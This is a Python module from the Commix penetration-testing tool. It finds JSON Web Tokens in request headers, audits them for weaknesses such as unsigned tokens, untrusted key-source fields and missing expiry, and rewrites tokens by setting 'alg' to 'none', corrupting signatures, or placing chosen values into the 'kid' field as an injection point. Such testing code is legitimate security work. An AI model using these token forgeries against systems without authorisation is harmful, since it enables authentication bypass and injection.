#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import json
import base64

"""
A JSON Web Token carried in a request is a parameter like any other - and a few of its fields are
read by the target before anything is authenticated at all, which is what makes them worth naming
here. 'kid' is the one that matters for this tool: it names which key to verify with, the target
looks that key up somewhere (a file, a row, a command), and a lookup built by concatenation is an
injection sink reached on every request. The audit itself is answered offline, from the token already
in the request; rebuilding one around a new 'kid' is the one thing here that writes a token out, and
it keeps the claims and the signature exactly as they arrived rather than signing anything.
"""

# base64url(header).base64url(payload).base64url(signature) - a header always begins '{"', which
# encodes to the literal 'eyJ', so this finds a token embedded in a larger cookie or header value.
JWT_REGEX = r"eyJ[A-Za-z0-9_-]{4,}\.eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*"

# Header fields that name where the verifying key is fetched from, rather than carrying it. Each is
# a documented way to point a target at key material it should not trust (CVE-2018-0114 and kin).
UNTRUSTED_KEY_SOURCE_FIELDS = ("jku", "x5u", "jwk", "x5c")

# Severity to sort rank, so the report leads with what matters most.
SEVERITY_RANK = {"critical": 0, "high": 1, "medium": 2, "info": 3}

# Findings that name something worth testing rather than something read off the token - reported as
# candidates, not as weaknesses already established.
CANDIDATES = ("alg-confusion", "kid-injection")

"""
Decode one base64url segment, whatever padding it was written with.
"""
def _segment(value):
  return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))

"""
Split a token into its decoded header and payload, or None where it is not a well-formed one.
"""
def parse(token):
  if not token or token.count(".") != 2:
    return None
  header, payload, signature = token.split(".")
  try:
    header = json.loads(_segment(header))
    payload = json.loads(_segment(payload))
  except Exception:
    return None
  if not isinstance(header, dict):
    return None
  return {"header": header, "payload": payload, "signature": signature, "raw": token}

"""
The same token with its 'kid' set to 'value' - the claims and the signature are left exactly as they
arrived, because this field is read to find the key before that signature is ever checked against it.
Nothing is re-signed here: where the target verifies first, the rebuilt token is simply refused.
"""
def rewrite_kid(token, value):
  data = parse(token)
  if not data:
    return token
  # Handed back untouched where the value is the one it already carries. A header is not written out
  # the way every issuer wrote it - the spacing and the order of its fields are theirs - so rebuilding
  # one that did not need rebuilding would answer with a token that differs from the one that arrived,
  # and the caller reads that as a value which was never carried this way at all.
  if str(data["header"].get("kid", "")) == str(value):
    return token
  header = dict(data["header"])
  header["kid"] = value
  rebuilt = json.dumps(header, separators=(",", ":")).encode()
  _, claims, signature = token.split(".")
  return base64.urlsafe_b64encode(rebuilt).decode().rstrip("=") + "." + claims + "." + signature

"""
The same token with its signature made into one no key could have produced, for asking the target
whether it reads the signature at all. The claims are untouched, so an answer that differs from the
real token's is the signature being checked, and nothing else.
"""
def break_signature(token):
  data = parse(token)
  if not data:
    return token
  header, claims, signature = token.split(".")
  # Flipped rather than replaced wholesale, so it stays the length and alphabet of the real one.
  flipped = "".join("A" if character != "A" else "B" for character in signature)
  return header + "." + claims + "." + (flipped or "AAAA")

"""
The same token rewritten to declare that it is unsigned, carrying the claims it already carried.
Nothing is signed here - the signature is dropped, which is what 'alg':'none' means.
"""
def strip_signature(token):
  data = parse(token)
  if not data:
    return token
  header = dict(data["header"])
  header["alg"] = "none"
  rebuilt = json.dumps(header, separators=(",", ":")).encode()
  return base64.urlsafe_b64encode(rebuilt).decode().rstrip("=") + "." + token.split(".")[1] + "."

"""
Every well-formed token found inside an arbitrary value (a 'Cookie' or 'Authorization' header).
"""
def find(value):
  return [match.group(0) for match in re.finditer(JWT_REGEX, value or "") if parse(match.group(0))]

"""
What is worth saying about a token, read from the token itself. Returns '(id, severity, summary,
detail)' tuples - answered offline, from the token already in the request.
"""
def audit(token):
  findings = []
  data = parse(token)
  if not data:
    return findings

  header, payload = data["header"], data["payload"]
  algorithm = (header.get("alg") or "").strip()

  # An unsigned token the target itself issued means its claims need no key to restate.
  if algorithm.lower() == "none" or data["signature"] == "":
    findings.append(("alg-none", "critical", "token declares alg '" + (algorithm or "none") + "' (unsigned)",
                     "its claims carry no signature to check them against"))

  if algorithm.upper().startswith(("RS", "ES", "PS")):
    findings.append(("alg-confusion", "info", "asymmetric algorithm '" + algorithm + "'",
                     "worth checking the target does not also accept an HMAC one"))

  for field in UNTRUSTED_KEY_SOURCE_FIELDS:
    if field in header:
      findings.append(("header-key-injection", "high", "header carries '" + field + "'",
                       "the key it is verified with is fetched from where the token says"))

  # The reason this check is here at all: 'kid' names the key to verify with, so the target resolves
  # it before the signature it would verify has been checked - a lookup built by concatenation is a
  # sink reached on every request, and this tool is built to test exactly that.
  if "kid" in header:
    findings.append(("kid-injection", "info", "header carries 'kid' ('" + str(header["kid"]) + "')",
                     "a key lookup worth testing as an injection point"))

  if isinstance(payload, dict) and "exp" not in payload:
    findings.append(("no-expiry", "high", "no 'exp' claim", "the token does not expire"))

  return findings
